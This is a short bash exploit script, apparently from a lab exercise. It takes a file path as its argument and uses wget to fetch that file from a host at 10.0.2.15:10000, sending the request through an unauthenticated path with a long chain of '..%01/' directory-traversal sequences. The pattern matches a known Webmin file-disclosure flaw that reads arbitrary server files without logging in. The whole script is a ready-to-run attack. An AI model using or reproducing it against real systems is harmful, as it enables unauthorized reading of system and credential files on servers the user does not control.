#!/bin/bash

if [ $# -eq 0 ];
then
	echo "Wrong number of arguments"
	echo "	$0 file"
	exit 1
fi

archivo_completo=$1
archivo=$(echo $archivo_completo | tr "/" " " | awk '{print $NF}')
url="http://10.0.2.15:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/"
complete_url="$url$archivo_completo"

wget $complete_url
